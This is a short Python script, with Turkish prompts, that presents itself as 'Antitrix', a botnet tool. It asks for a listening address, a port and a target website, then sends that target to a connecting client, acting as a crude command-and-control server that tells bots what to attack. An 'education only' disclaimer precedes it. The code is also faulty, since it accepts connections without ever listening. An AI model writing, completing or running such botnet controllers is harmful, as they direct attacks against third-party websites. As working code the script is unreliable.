import requests
import socket
import time
from colorama import init
from termcolor import colored
init()
print('bu yazilim ovsky ailesinden Ömovsky tarafindan kodlanmiş bir botnet aracidir')
print('bu yazilim eğitim için kodlanmistir herhangi bir illegal kullanimdan ben sorumlu değilimdir')
print(colored("""\

   ___   _   _  _____  _____  _____ ______  _____ __   __
 / _ \ | \ | ||_   _||_   _||_   _|| ___ \|_   _|\ \ / /
/ /_\ \|  \| |  | |    | |    | |  | |_/ /  | |   \ V / 
|  _  || . ` |  | |    | |    | |  |    /   | |   /   \ 
| | | || |\  |  | |   _| |_   | |  | |\ \  _| |_ / /^\ 
\_| |_/\_| \_/  \_/   \___/   \_/  \_| \_| \___/ \/   \/


                    """,'red'))
print('Antitrix başlatiliyor...')
time.sleep(10)
ipadresi= str(input('dinleme yapilacak ip:' ))
port= int(input('dinlenicek port'))
saldirilacaksite= input('saldirilacak web sitesi')
soket= socket.socket()
soket.bind((ipadresi,port))
conn, addr= soket.accept()
conn.sendall(saldirilacaksite.encode())
